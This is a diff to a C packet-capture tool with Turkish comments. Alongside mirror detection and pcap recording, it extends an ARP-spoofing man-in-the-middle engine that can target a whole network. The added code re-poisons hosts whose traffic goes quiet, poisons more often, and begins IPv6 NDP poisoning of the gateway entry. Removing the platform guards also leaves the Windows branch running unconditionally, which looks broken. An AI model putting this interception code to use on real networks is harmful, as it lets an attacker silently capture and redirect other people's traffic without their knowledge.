@@ -14,7 +14,6 @@
 #include <time.h>
 #include <stdarg.h>
 
-#ifdef PLATFORM_LINUX
 #include <pcap.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
@@ -25,7 +24,8 @@
 #include <netpacket/packet.h>
 #include <net/ethernet.h>
 #include <fcntl.h>
-#endif
+#include <net/if.h>
+#include <sys/stat.h>
 
 
 static int initialized = 0;
@@ -45,10 +45,46 @@ static int total_captured = 0;  /* toplam yakalanan paket (kümülatif, sadece s
 /* ---- STATS ---- */
 static FullStats stats;
 
-#if defined(PLATFORM_LINUX)
 static pcap_t *pcap_handle = NULL;
 static int g_datalink_type = 1; /* DLT_EN10MB default */
-#endif
+
+/* ---- Ileri bildirimler (sonra tanimlananlar) ---- */
+static void arp_spoof_note_seen(PacketRecord *pkt);
+static void pcap_dump_record(const struct pcap_pkthdr *header, const u_char *packet);
+static int  spoof_get_own_mac(const char *iface, unsigned char *mac);
+static int  spoof_parse_mac(const char *s, unsigned char mac[6]);
+static void ndp_poison_cycle(int raw_fd, const char *iface);
+static int  ndp_resolve_gateway_v6(char *gw6, int gw6_len);
+
+/* ---- Acilan yakalama arayuzu ---- */
+static char g_capture_opened_iface[MAX_IFACE_LEN] = {0};
+
+/* ---- SPAN / Port Mirror tespiti ---- */
+static unsigned long g_foreign_frame_count = 0;
+static int  g_mirror_suspected = 0;
+static unsigned char g_own_mac_mirror[6];
+static int  g_own_mac_mirror_valid = 0;
+
+/* ---- PCAP disk kaydi ---- */
+static pcap_dumper_t *g_pcap_dumper = NULL;
+static char g_pcap_dump_path[512] = {0};
+static unsigned long long g_pcap_dump_bytes = 0;
+static unsigned long long g_pcap_dump_packets = 0;
+static platform_mutex_t g_dump_lock;
+static int  g_dump_lock_init = 0;
+
+/* ---- Cihaz aktivite halka tamponu ---- */
+#define ACT_RING_SIZE 64
+typedef struct {
+    double timestamp;
+    char mac[MAX_MAC_LEN];
+    char sip[MAX_IP_LEN];
+    char dip[MAX_IP_LEN];
+    char proto[16];
+} ActEntry;
+static ActEntry g_act_ring[ACT_RING_SIZE];
+static int g_act_head = 0;
+static int g_act_count = 0;
 
 /* ==================================================================
  *   DISSECTOR LAYER — her protokol için ayrı fonksiyon
@@ -343,6 +379,10 @@ static void dissect_arp(PacketRecord *pkt, const u_char *data, int len, int base
         snprintf(pkt->info, sizeof(pkt->info), "Who has %s? Tell %s", tpa, spa);
     else
         snprintf(pkt->info, sizeof(pkt->info), "%s is at %s", spa, sha);
+
+    /* Gercek trafik gorunumu: ARP kayitlarinda da IP alanlarini doldur */
+    strncpy(pkt->src_ip, spa, sizeof(pkt->src_ip) - 1);
+    strncpy(pkt->dst_ip, tpa, sizeof(pkt->dst_ip) - 1);
 
     add_layer(pkt, LAYER_ARP, "Address Resolution Protocol", pkt->info, base_off, 28,
               "Hardware type: %d\nProtocol type: 0x%04x\nOpcode: %s (%d)\n"
@@ -1125,6 +1165,141 @@ static int parse_dns_name(char *out, int out_len, const u_char *data, int off, i
 }
 
 /* ==================================================================
+ *   SPAN / MIRROR TESPITI + CIHAZ AKTIVITESI + TEK KARE DISSECT
+ * ================================================================== */
+
+/* Kendi MAC'imizi arayuzden al (mirror karsilastirmasi icin) */
+static void mirror_init_own_mac(const char *iface) {
+    g_own_mac_mirror_valid = 0;
+    const char *real = iface;
+    char fallback[MAX_IFACE_LEN] = {0};
+    if (!real || !real[0] || strcmp(real, "any") == 0) {
+        platform_get_default_interface(fallback, sizeof(fallback));
+        real = fallback;
+    }
+    if (real && real[0] && spoof_get_own_mac(real, g_own_mac_mirror) == 0) {
+        g_own_mac_mirror_valid = 1;
+        fprintf(stderr, "[FULL_MONITOR] Kendi MAC (mirror tespiti): %02x:%02x:%02x:%02x:%02x:%02x (%s)\n",
+                g_own_mac_mirror[0], g_own_mac_mirror[1], g_own_mac_mirror[2],
+                g_own_mac_mirror[3], g_own_mac_mirror[4], g_own_mac_mirror[5], real);
+    }
+}
+
+/* SPAN/mirror algilama: bize gonderilmeyen (foreign) kareleri say.
+ * Switch port mirror/SPAN aciksa, baska cihazlar arasindaki kareler de
+ * bize tasinir -> dst MAC bizim MAC'imiz degildir. */
+static void mirror_note_frame(PacketRecord *pkt) {
+    if (!g_own_mac_mirror_valid) return;
+    if (!pkt || pkt->dst_mac[0] == '\0') return;
+    if (strcmp(pkt->dst_mac, "(us)") == 0) return;   /* SLL: bize gelen */
+    if (strcmp(pkt->src_mac, "(us)") == 0) return;   /* SLL: bizden giden */
+    unsigned char dm[6];
+    if (spoof_parse_mac(pkt->dst_mac, dm) != 0) return;
+    if (memcmp(dm, g_own_mac_mirror, 6) == 0) return; /* bize ait */
+    if (dm[0] & 0x01) return;                         /* broadcast/multicast sayma */
+    __sync_fetch_and_add(&g_foreign_frame_count, 1);
+    if (g_foreign_frame_count > 50) g_mirror_suspected = 1;
+}
+
+int full_monitor_get_foreign_frame_count(void) {
+    return (int)__sync_fetch_and_add(&g_foreign_frame_count, 0);
+}
+
+int full_monitor_mirror_suspected(void) {
+    return g_mirror_suspected ? 1 : 0;
+}
+
+int full_monitor_own_mac(char *out, int max_len) {
+    if (!out || max_len <= 0) return -1;
+    if (!g_own_mac_mirror_valid) {
+        out[0] = '\0';
+        return -1;
+    }
+    snprintf(out, max_len, "%02x:%02x:%02x:%02x:%02x:%02x",
+             g_own_mac_mirror[0], g_own_mac_mirror[1], g_own_mac_mirror[2],
+             g_own_mac_mirror[3], g_own_mac_mirror[4], g_own_mac_mirror[5]);
+    return 0;
+}
+
+/* ---- Cihaz aktivite takibi ---- */
+static void act_note(PacketRecord *pkt) {
+    if (!pkt) return;
+    if (pkt->src_mac[0] == '\0' && pkt->src_ip[0] == '\0' &&
+        pkt->dst_ip[0] == '\0') return;
+    platform_mutex_lock(&global_lock);
+    ActEntry *e = &g_act_ring[g_act_head];
+    e->timestamp = pkt->timestamp;
+    e->mac[0] = '\0';
+    if (pkt->src_mac[0] && strcmp(pkt->src_mac, "(us)") != 0)
+        strncpy(e->mac, pkt->src_mac, sizeof(e->mac) - 1);
+    strncpy(e->sip, pkt->src_ip, sizeof(e->sip) - 1);
+    strncpy(e->dip, pkt->dst_ip, sizeof(e->dip) - 1);
+    strncpy(e->proto, pkt->protocol, sizeof(e->proto) - 1);
+    g_act_head = (g_act_head + 1) % ACT_RING_SIZE;
+    if (g_act_count < ACT_RING_SIZE) g_act_count++;
+    platform_mutex_unlock(&global_lock);
+}
+
+int full_monitor_device_active(const char *ip, const char *mac, double window_sec) {
+    double now = (double)time(NULL);
+    platform_mutex_lock(&global_lock);
+    int found = 0;
+    for (int i = 0; i < g_act_count; i++) {
+        int idx = (g_act_head - 1 - i + 2 * ACT_RING_SIZE) % ACT_RING_SIZE;
+        ActEntry *e = &g_act_ring[idx];
+        if (now - e->timestamp > window_sec) break;  /* en yeni -> en eski */
+        if (ip && ip[0] && strcmp(e->sip, ip) == 0) { found = 1; break; }
+        if (ip && ip[0] && strcmp(e->dip, ip) == 0) { found = 1; break; }
+        if (mac && mac[0] && e->mac[0] && strcmp(e->mac, mac) == 0) { found = 1; break; }
+    }
+    platform_mutex_unlock(&global_lock);
+    return found;
+}
+
+int full_monitor_activity_slots(char *out, int max_len) {
+    if (!out || max_len <= 0) return 0;
+    platform_mutex_lock(&global_lock);
+    int n = (g_act_count < 12) ? g_act_count : 12;
+    int pos = 0;
+    for (int i = 0; i < n && pos < max_len - 1; i++) {
+        int idx = (g_act_head - 1 - i + 2 * ACT_RING_SIZE) % ACT_RING_SIZE;
+        ActEntry *e = &g_act_ring[idx];
+        char chunk[128];
+        snprintf(chunk, sizeof(chunk), "%s|%s|%s%s",
+                 e->sip[0] ? e->sip : "-", e->mac[0] ? e->mac : "-",
+                 e->proto[0] ? e->proto : "-", i < n - 1 ? "," : "");
+        int cl = (int)strlen(chunk);
+        if (pos + cl >= max_len - 1) break;
+        memcpy(out + pos, chunk, cl);
+        pos += cl;
+    }
+    out[pos] = '\0';
+    platform_mutex_unlock(&global_lock);
+    return n;
+}
+
+/* ---- Tek kare dissect (yalitilmis birim testi icin) ---- */
+int full_monitor_dissect_frame(int datalink_type, const unsigned char *data,
+                               int caplen, PacketRecord *out) {
+    if (!out || !data || caplen <= 0) return 0;
+    memset(out, 0, sizeof(PacketRecord));
+    out->timestamp = (double)time(NULL);
+    out->length = caplen;
+    if (datalink_type == DLT_LINUX_SLL)
+        dissect_linux_sll(out, data, caplen);
+    else
+        dissect_ethernet(out, data, caplen);
+    if (out->protocol[0] == '\0') {
+        strncpy(out->protocol, "ETH", sizeof(out->protocol) - 1);
+        strncpy(out->info, "Ethernet frame", sizeof(out->info) - 1);
+    }
+    int raw_len = (caplen < MAX_RAW_SIZE) ? caplen : MAX_RAW_SIZE;
+    memcpy(out->raw_data, data, raw_len);
+    out->raw_len = raw_len;
+    return 1;
+}
+
+/* ==================================================================
  *   CORE API
  * ================================================================== */
 
@@ -1136,6 +1311,10 @@ void full_monitor_init(void) {
     write_idx = 0;
     packet_count = 0;
     total_captured = 0;
+    if (!g_dump_lock_init) {
+        platform_mutex_init(&g_dump_lock);
+        g_dump_lock_init = 1;
+    }
     initialized = 1;
 }
 
@@ -1143,6 +1322,11 @@ void full_monitor_cleanup(void) {
     if (!initialized) return;
     running = 0;
     platform_sleep_ms(200);
+    full_monitor_pcap_record_stop();
+    if (g_dump_lock_init) {
+        platform_mutex_destroy(&g_dump_lock);
+        g_dump_lock_init = 0;
+    }
     platform_mutex_destroy(&global_lock);
     initialized = 0;
 }
@@ -1162,22 +1346,24 @@ static void handle_packet(const struct pcap_pkthdr *header, const u_char *packet
     memcpy(pkt.raw_data, packet, raw_len);
     pkt.raw_len = raw_len;
 
-    /* Başla: datalink tipine göre dissect */
-#ifdef PLATFORM_LINUX
+    /* Başla: datalink tipine göre dissect (SADECE 1 kere!) */
     if (g_datalink_type == DLT_LINUX_SLL) {
         dissect_linux_sll(&pkt, packet, header->caplen);
     } else {
         dissect_ethernet(&pkt, packet, header->caplen);
     }
-#else
-    dissect_ethernet(&pkt, packet, header->caplen);
-#endif
+    /* DÜZELTME: SLL kareleri ikinci kez Ethernet olarak dissect ediliyordu
+       (fazladan dissect_ethernet çağrısı) -> kaldırıldı. */
 
     /* IDS besleme: ham veri yalnizca Ethernet datalink'te guvenilir */
-#if defined(PLATFORM_LINUX)
     if (g_datalink_type == DLT_EN10MB)
         ids_process_packet(&pkt);
-#endif
+
+    /* SPAN/mirror algilama + cihaz aktivitesi + ARP spoof watchdog + PCAP kaydi */
+    mirror_note_frame(&pkt);
+    act_note(&pkt);
+    arp_spoof_note_seen(&pkt);   /* iceride calisma durumu kontrol edilir */
+    pcap_dump_record(header, packet);
 
     /* Eğer protokol hâlâ boşsa varsayılan ata */
     if (pkt.protocol[0] == '\0') {
@@ -1195,12 +1381,10 @@ static void handle_packet(const struct pcap_pkthdr *header, const u_char *packet
     platform_mutex_unlock(&global_lock);
 }
 
-#if defined(PLATFORM_LINUX)
 static void pcap_cb(u_char *user, const struct pcap_pkthdr *h, const u_char *pkt) {
     (void)user;
     handle_packet(h, pkt);
 }
-#endif
 
 /* Try to open an interface, only accept Ethernet (DLT_EN10MB) datalink */
 static pcap_t *try_open_ethernet(const char *name, char *errbuf) {
@@ -1214,6 +1398,7 @@ static pcap_t *try_open_ethernet(const char *name, char *errbuf) {
         return NULL;
     }
     fprintf(stderr, "[FULL_MONITOR] Opened %s (Ethernet)\n", name);
+    strncpy(g_capture_opened_iface, name, sizeof(g_capture_opened_iface) - 1);
     return h;
 }
 
@@ -1477,7 +1662,6 @@ static void *procnet_fallback_thread(void *arg) {
 
 static void *monitor_thread(void *arg) {
     char *iface = (char *)arg;
-#if defined(PLATFORM_LINUX)
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t *handle = NULL;
 
@@ -1485,7 +1669,6 @@ static void *monitor_thread(void *arg) {
         /* Phase 0: Default route'un oldugu arayuzu oncelikle dene.
          * Trafik ve ARP spoof oradan aktigi icin dogru NIC budur;
          * "wlan once" secimi, wlan0 sessizken hic paket gostermez. */
-#ifdef PLATFORM_LINUX
         FILE *rf = fopen("/proc/net/route", "r");
         if (rf) {
             char line[256];
@@ -1511,12 +1694,10 @@ static void *monitor_thread(void *arg) {
                     fprintf(stderr, "[FULL_MONITOR] Default-route iface: %s\n", best_if);
             }
         }
-#endif /* PLATFORM_LINUX */
 
 
         pcap_if_t *devs;
         if (!handle && pcap_findalldevs(&devs, errbuf) >= 0 && devs) {
-#ifdef PLATFORM_LINUX
             /*
              * Phase 1: Prefer known real network interfaces.
              * Order: wlan*, eth*, enp*, ens*, eno*, then "any".
@@ -1545,6 +1726,7 @@ static void *monitor_thread(void *arg) {
                                 handle = NULL;
                             } else {
                                 fprintf(stderr, "[FULL_MONITOR] Opened 'any' (dlt=%d)\n", dlt);
+                                strncpy(g_capture_opened_iface, "any", sizeof(g_capture_opened_iface) - 1);
                             }
                         }
                         break;
@@ -1567,7 +1749,6 @@ static void *monitor_thread(void *arg) {
                 }
             }
 
-#else
             /* Windows: dongusal (loopback) aygitlari atla; aciklamada varsayilan
              * adaptorun FriendlyName'i gecen aygita, sonra ilk fiziksel aygita oncelik ver. */
             char friendly[MAX_IFACE_LEN] = {0};
@@ -1590,7 +1771,6 @@ static void *monitor_thread(void *arg) {
                     continue;
                 handle = try_open_ethernet(d->name, errbuf);
             }
-#endif /* PLATFORM_LINUX */
 
             pcap_freealldevs(devs);
         }
@@ -1607,6 +1787,9 @@ static void *monitor_thread(void *arg) {
         g_datalink_type = dlt;
         pcap_handle = handle;
         g_capture_mode = 2;   /* pcap: tüm ağ trafiği görülebilir (root gerekli) */
+        if (!g_capture_opened_iface[0] && iface && iface[0])
+            strncpy(g_capture_opened_iface, iface, sizeof(g_capture_opened_iface) - 1);
+        mirror_init_own_mac(g_capture_opened_iface);
         pcap_setnonblock(handle, 1, errbuf);
 
         fprintf(stderr, "[FULL_MONITOR] Capture started (datalink=%d)\n", dlt);
@@ -1624,7 +1807,6 @@ static void *monitor_thread(void *arg) {
         procnet_fallback_thread(NULL);
     }
 
-#endif
     free(iface);
     return NULL;
 }
@@ -1640,10 +1822,9 @@ void full_monitor_start(const char *iface) {
 
 void full_monitor_stop(void) {
     running = 0;
-#if defined(PLATFORM_LINUX)
     if (pcap_handle) pcap_breakloop(pcap_handle);
-#endif
     platform_sleep_ms(150);  /* thread'in kapanması için kısa bekle */
+    full_monitor_pcap_record_stop();
     g_capture_mode = 0;
 }
 
@@ -1660,6 +1841,11 @@ void full_monitor_clear(void) {
     packet_count = 0;
     total_captured = 0;
     memset(&stats, 0, sizeof(stats));
+    g_foreign_frame_count = 0;
+    g_mirror_suspected = 0;
+    g_act_head = 0;
+    g_act_count = 0;
+    memset(g_act_ring, 0, sizeof(g_act_ring));
     platform_mutex_unlock(&global_lock);
 }
 
@@ -1702,6 +1888,89 @@ void full_monitor_get_stats(FullStats *s) {
 }
 
 /* ==================================================================
+ *   PCAP DISK KAYDI — yakalanan kareler .pcap dosyasina yazilir
+ * ================================================================== */
+
+int full_monitor_pcap_record_start(const char *path) {
+    if (!path || !path[0]) return -1;
+    if (!pcap_handle) {
+        fprintf(stderr, "[PCAP] Kayit baslatilamadi: aktif pcap handle yok\n");
+        return -1;
+    }
+    if (!g_dump_lock_init) {
+        platform_mutex_init(&g_dump_lock);
+        g_dump_lock_init = 1;
+    }
+    platform_mutex_lock(&g_dump_lock);
+    if (g_pcap_dumper) {
+        platform_mutex_unlock(&g_dump_lock);
+        return -2;  /* zaten kaydediyor */
+    }
+    g_pcap_dumper = pcap_dump_open(pcap_handle, path);
+    if (!g_pcap_dumper) {
+        platform_mutex_unlock(&g_dump_lock);
+        fprintf(stderr, "[PCAP] Kayit dosyasi acilamadi: %s\n", path);
+        return -3;
+    }
+    strncpy(g_pcap_dump_path, path, sizeof(g_pcap_dump_path) - 1);
+    g_pcap_dump_bytes = 0;
+    g_pcap_dump_packets = 0;
+    platform_mutex_unlock(&g_dump_lock);
+    fprintf(stderr, "[PCAP] Kayit basladi: %s\n", path);
+    return 0;
+}
+
+void full_monitor_pcap_record_stop(void) {
+    platform_mutex_lock(&g_dump_lock);
+    if (g_pcap_dumper) {
+        pcap_dump_flush(g_pcap_dumper);
+        pcap_dump_close(g_pcap_dumper);
+        g_pcap_dumper = NULL;
+    }
+    platform_mutex_unlock(&g_dump_lock);
+    fprintf(stderr, "[PCAP] Kayit durduruldu (%llu paket)\n", g_pcap_dump_packets);
+}
+
+int full_monitor_pcap_record_is_active(void) {
+    return g_pcap_dumper ? 1 : 0;
+}
+
+void full_monitor_pcap_record_path(char *out, int max_len) {
+    if (!out || max_len <= 0) return;
+    platform_mutex_lock(&g_dump_lock);
+    if (g_pcap_dump_path[0])
+        strncpy(out, g_pcap_dump_path, (size_t)(max_len - 1));
+    else
+        out[0] = ' ';
+    platform_mutex_unlock(&g_dump_lock);
+}
+
+unsigned long long full_monitor_pcap_record_bytes(void) {
+    platform_mutex_lock(&g_dump_lock);
+    unsigned long long b = g_pcap_dump_bytes;
+    platform_mutex_unlock(&g_dump_lock);
+    if (!g_pcap_dumper || g_pcap_dump_path[0] == '\0') return b;
+    /* Gercek disk boyutunu sor (pcap_dump yazimi tamponludur) */
+    struct stat st;
+    if (stat(g_pcap_dump_path, &st) == 0) return (unsigned long long)st.st_size;
+    return b;
+}
+
+/* handle_packet'ten cagrilir: kayit aktifse 1 kare yaz */
+static void pcap_dump_record(const struct pcap_pkthdr *header, const u_char *packet) {
+    if (!g_pcap_dumper) return;
+    platform_mutex_lock(&g_dump_lock);
+    if (!g_pcap_dumper) {   /* lock beklerken kapatilmis olabilir */
+        platform_mutex_unlock(&g_dump_lock);
+        return;
+    }
+    pcap_dump((u_char *)g_pcap_dumper, header, packet);
+    g_pcap_dump_packets++;
+    g_pcap_dump_bytes += (unsigned long long)header->caplen;
+    platform_mutex_unlock(&g_dump_lock);
+}
+
+/* ==================================================================
  *   ARP SPOOF ENGINE — Ağdaki diğer cihazların trafiğini yakalamak için
  *   MITM (Man-in-the-Middle) ARP zehirleme motoru.
  *
@@ -1712,7 +1981,6 @@ void full_monitor_get_stats(FullStats *s) {
  *   4. pcap zaten promiscuous modda çalıştığı için bu trafiği yakalar
  * ================================================================== */
 
-#ifdef PLATFORM_LINUX
 
 /* ARP spoof state */
 static int g_arp_spoof_running = 0;
@@ -1727,12 +1995,28 @@ static char g_spoof_iface[MAX_IFACE_LEN] = {0};
 static volatile int g_arp_raw_fd = -1;
 static int g_ip_forward_original = -1;
 
+/* ---- ARP spoof watchdog: trafik gorulmeyen hedefleri yeniden zehirle ---- */
+static double g_target_last_seen = 0.0;
+static int    g_gateway_mac_valid = 0;
+
+/* ---- NDP (IPv6) zehirleme ---- */
+#ifndef ETH_P_IPV6
+#define ETH_P_IPV6 0x86DD
+#endif
+static int     g_ndp_running = 0;
+static char    g_gateway_v6[INET6_ADDRSTRLEN] = {0};
+static int     g_gateway_v6_valid = 0;
+static unsigned char g_gateway_v6_mac[6];
+static int     g_gateway_v6_mac_valid = 0;
+static volatile int g_ndp_raw_fd = -1;
+
 /* ---- Coklu hedef spoof (tum ag MITM) ---- */
 #define MAX_SPOOF_TARGETS 256
 typedef struct {
     char ip[MAX_IP_LEN];
     unsigned char mac[6];
     int  mac_valid;
+    double last_seen;   /* bu hedefin son paket gorulme zamani (watchdog) */
 } SpoofTarget;
 
 static SpoofTarget g_spoof_targets[MAX_SPOOF_TARGETS];
@@ -1900,6 +2184,100 @@ static int spoof_parse_mac(const char *s, unsigned char mac[6]) {
     return 0;
 }
 
+/* --- ARP Spoof watchdog / yardimci fonksiyonlar --- */
+static int spoof_is_target_ip(const char *ip) {
+    if (!ip || !ip[0]) return 0;
+    if (g_spoof_target_ip[0] && strcmp(ip, g_spoof_target_ip) == 0) return 1;
+    for (int i = 0; i < g_spoof_target_count; i++) {
+        if (strcmp(ip, g_spoof_targets[i].ip) == 0) return 1;
+    }
+    return 0;
+}
+
+/* Bir hedef IP icin kayitli son gorulme zamani (epoch saniye) */
+static double spoof_target_last_seen_raw(const char *ip) {
+    if (!ip || !ip[0]) return 0.0;
+    if (g_spoof_target_ip[0] && strcmp(ip, g_spoof_target_ip) == 0)
+        return g_target_last_seen;
+    for (int i = 0; i < g_spoof_target_count; i++) {
+        if (strcmp(ip, g_spoof_targets[i].ip) == 0)
+            return g_spoof_targets[i].last_seen;
+    }
+    return 0.0;
+}
+
+/* Tek hedefi yeniden zehirle (watchdog) */
+static void spoof_repoison_target(int raw_fd, SpoofTarget *t) {
+    if (!t || !t->mac_valid || raw_fd < 0) return;
+    send_arp_reply(raw_fd, g_spoof_iface, g_my_mac, g_spoof_gateway_ip, t->mac, t->ip);
+    send_arp_reply(raw_fd, g_spoof_iface, g_my_mac, t->ip, g_gateway_mac, g_spoof_gateway_ip);
+    fprintf(stderr, "[ARP_SPOOF] Watchdog: yeniden zehirlendi: %s\n", t->ip);
+}
+
+/* Watchdog: son 5 saniyede trafigi gorulmeyen hedefi yeniden zehirle */
+static void arp_spoof_watchdog(int raw_fd, int single_mode) {
+    double now = (double)time(NULL);
+    if (raw_fd < 0) return;
+    int acted = 0;
+
+    platform_mutex_lock(&g_spoof_lock);
+    if (single_mode) {
+        if (g_target_mac_valid &&
+            g_target_last_seen > 0 &&
+            (now - g_target_last_seen) > 5.0) {
+            send_arp_reply(raw_fd, g_spoof_iface,
+                           g_my_mac, g_spoof_gateway_ip,
+                           g_target_mac, g_spoof_target_ip);
+            send_arp_reply(raw_fd, g_spoof_iface,
+                           g_my_mac, g_spoof_target_ip,
+                           g_gateway_mac, g_spoof_gateway_ip);
+            g_target_last_seen = now;
+            acted = 1;
+        }
+    } else {
+        for (int i = 0; i < g_spoof_target_count; i++) {
+            SpoofTarget *t = &g_spoof_targets[i];
+            if (t->last_seen <= 0 || (now - t->last_seen) <= 5.0) continue;
+            spoof_repoison_target(raw_fd, t);
+            t->last_seen = now;
+            acted = 1;
+        }
+    }
+    platform_mutex_unlock(&g_spoof_lock);
+
+    if (acted)
+        fprintf(stderr, "[ARP_SPOOF] Watchdog: sessiz kanallar yeniden zehirlendi\n");
+}
+
+/* handle_packet'ten cagrilir: hedef trafigini not et (running degilse aninda don) */
+static void arp_spoof_note_seen(PacketRecord *pkt) {
+    if (!g_arp_spoof_running) return;   /* spoof kapaliysa hicbir kilide dokunma */
+    if (!pkt || !pkt->src_ip[0]) return;
+    double now = pkt->timestamp > 0 ? pkt->timestamp : (double)time(NULL);
+    platform_mutex_lock(&g_spoof_lock);
+    if (spoof_is_target_ip(pkt->src_ip)) {
+        if (g_spoof_target_ip[0]) {
+            g_target_last_seen = now;
+        } else {
+            for (int i = 0; i < g_spoof_target_count; i++) {
+                if (strcmp(pkt->src_ip, g_spoof_targets[i].ip) == 0) {
+                    g_spoof_targets[i].last_seen = now;
+                    break;
+                }
+            }
+        }
+    }
+    platform_mutex_unlock(&g_spoof_lock);
+}
+
+/* Public: hedef IP icin son trafik zamani (saniye cinsinden, -1 = hic gorulmedi) */
+double arp_spoof_target_last_seen(const char *ip) {
+    double now = (double)time(NULL);
+    double seen = spoof_target_last_seen_raw(ip);
+    if (seen <= 0) return -1.0;
+    return now - seen;
+}
+
 /* --- ARP Spoof döngüsü (ayrı thread) --- */
 static void *arp_spoof_loop(void *arg) {
     (void)arg;
@@ -1924,6 +2302,24 @@ static void *arp_spoof_loop(void *arg) {
     fprintf(stderr, "[ARP_SPOOF] Gateway MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
             g_gateway_mac[0], g_gateway_mac[1], g_gateway_mac[2],
             g_gateway_mac[3], g_gateway_mac[4], g_gateway_mac[5]);
+    g_gateway_mac_valid = 1;
+
+    /* IPv6 (NDP) hedefi: gateway link-local adresini coz, raw soket ac */
+    if (ndp_resolve_gateway_v6(g_gateway_v6, sizeof(g_gateway_v6)) == 0) {
+        g_gateway_v6_valid = 1;
+        memcpy(g_gateway_v6_mac, g_gateway_mac, 6);
+        g_gateway_v6_mac_valid = 1;
+        int ndp_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IPV6));
+        if (ndp_fd >= 0) {
+            g_ndp_raw_fd = ndp_fd;
+            g_ndp_running = 1;
+            fprintf(stderr, "[NDP] IPv6 zehirleme soketi acildi, GW6: %s\n", g_gateway_v6);
+        } else {
+            fprintf(stderr, "[NDP] IPv6 raw soket acilamadi (root gerekli)\n");
+        }
+    } else {
+        fprintf(stderr, "[NDP] Gateway IPv6 cozulemedi, IPv6 zehirleme devre disi\n");
+    }
 
     /* Tek hedefli moddaysa hedef MAC'i onceden coz */
     int single_mode = (g_spoof_target_ip[0] != '\0');
@@ -1947,6 +2343,13 @@ static void *arp_spoof_loop(void *arg) {
             single_mode ? g_spoof_target_ip : "<TUM AG>",
             g_spoof_gateway_ip, g_spoof_iface,
             single_mode ? "" : " [coklu hedef modu]");
+
+    /* Watchdog zamanlari: baslangicta herkes "yeni goruldu" sayilir */
+    g_target_last_seen = (double)time(NULL);
+    platform_mutex_lock(&g_spoof_lock);
+    for (int i = 0; i < g_spoof_target_count; i++)
+        g_spoof_targets[i].last_seen = g_target_last_seen;
+    platform_mutex_unlock(&g_spoof_lock);
 
     while (g_arp_spoof_running) {
         platform_mutex_lock(&g_spoof_lock);
@@ -1976,8 +2379,13 @@ static void *arp_spoof_loop(void *arg) {
         }
         platform_mutex_unlock(&g_spoof_lock);
 
-        /* 2 saniyede bir tekrarla (ARP cache yenileme) */
-        for (int i = 0; i < 20 && g_arp_spoof_running; i++)
+        /* Watchdog: sessiz hedefleri yeniden zehirle + NDP (IPv6) zehirle */
+        arp_spoof_watchdog(raw_fd, single_mode);
+        if (g_ndp_running && g_gateway_v6_valid && g_ndp_raw_fd >= 0)
+            ndp_poison_cycle(g_ndp_raw_fd, g_spoof_iface);
+
+        /* 1 saniyede bir tekrarla (ARP cache yenileme) */
+        for (int i = 0; i < 10 && g_arp_spoof_running; i++)
             platform_sleep_ms(100);
     }
 
@@ -2015,8 +2423,19 @@ static void *arp_spoof_loop(void *arg) {
     }
     platform_mutex_unlock(&g_spoof_lock);
 
+    /* IPv6 zehirleme soketini kapat */
+    if (g_ndp_raw_fd >= 0) {
+        close(g_ndp_raw_fd);
+        g_ndp_raw_fd = -1;
+    }
+    g_ndp_running = 0;
+
     close(raw_fd);
     g_arp_raw_fd = -1;
+    g_gateway_mac_valid = 0;
+    g_gateway_v6_valid = 0;
+    g_gateway_v6_mac_valid = 0;
+    g_target_last_seen = 0.0;
     fprintf(stderr, "[ARP_SPOOF] Durduruldu, ARP cache temizlendi.\n");
     return NULL;
 }
@@ -2052,6 +2471,217 @@ void disable_ip_forward(void) {
     }
 }
 
+/* ==================================================================
+ *   NDP (IPv6) ZEHIRLEME — ARP spoof'un IPv6 karsiligi
+ *   Hedefin NDP cache'ine "gateway'in link-local adresi = bizim MAC"
+ *   NDP Neighbor Advertisement (NA) kareleri ile yazilir.
+ * ================================================================== */
+
+/* MAC -> IPv6 link-local adres (EUI-64 donusumu, RFC 4291) */
+static int mac_to_linklocal(const unsigned char mac[6], char *out, int out_len) {
+    if (!mac || !out || out_len < INET6_ADDRSTRLEN) return -1;
+    unsigned char ll[16] = {0};
+    ll[0] = 0xfe; ll[1] = 0x80;
+    ll[8]  = mac[0] ^ 0x02;   /* U/L bitini cevir */
+    ll[9]  = mac[1];
+    ll[10] = mac[2];
+    ll[11] = 0xff;
+    ll[12] = 0xfe;
+    ll[13] = mac[3];
+    ll[14] = mac[4];
+    ll[15] = mac[5];
+    if (inet_ntop(AF_INET6, ll, out, out_len) == NULL) return -1;
+    return 0;
+}
+
+static int hexch(char c) {
+    if (c >= '0' && c <= '9') return c - '0';
+    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
+    return -1;
+}
+
+static int ipv6_hex_to_bin(const char *s, unsigned char out[16]) {
+    if (!s) return -1;
+    for (int i = 0; i < 16; i++) {
+        int hi = hexch(s[2 * i]);
+        int lo = hexch(s[2 * i + 1]);
+        if (hi < 0 || lo < 0) return -1;
+        out[i] = (unsigned char)((hi << 4) | lo);
+    }
+    return 0;
+}
+
+/* Gateway IPv6 link-local adresini bul:
+ * 1) /proc/net/ipv6_route default (::/0) kuralinin next-hop adresi
+ * 2) olmazsa gateway MAC'inden EUI-64 uret */
+static int ndp_resolve_gateway_v6(char *gw6, int gw6_len) {
+    if (!gw6 || gw6_len < INET6_ADDRSTRLEN) return -1;
+    FILE *f = fopen("/proc/net/ipv6_route", "r");
+    if (f) {
+        char line[512];
+        while (fgets(line, sizeof(line), f)) {
+            char dst[40] = {0}, src[40] = {0}, nxt[40] = {0};
+            unsigned int dlen = 0, slen = 0;
+            /* sutunlar: dest dlen src slen next metric ref use iface */
+            if (sscanf(line, "%39s %x %39s %x %39s %x %*s %*s",
+                       dst, &dlen, src, &slen, nxt, &slen) < 5)
+                continue;
+            (void)dst; (void)src; (void)slen;
+            int all_zero = 1;
+            for (int i = 0; i < 32; i++)
+                if (dst[i] != '0') { all_zero = 0; break; }
+            if (all_zero && dlen == 0) {   /* ::/0 default kurali */
+                unsigned char bin[16];
+                if (ipv6_hex_to_bin(nxt, bin) == 0 &&
+                    bin[0] == 0xfe && (bin[1] & 0xc0) == 0x80 &&
+                    inet_ntop(AF_INET6, bin, gw6, gw6_len) != NULL) {
+                    fclose(f);
+                    return 0;
+                }
+            }
+        }
+        fclose(f);
+    }
+    /* Fallback: gateway MAC -> EUI-64 link-local */
+    if (g_gateway_mac_valid && mac_to_linklocal(g_gateway_mac, gw6, gw6_len) == 0)
+        return 0;
+    return -1;
+}
+
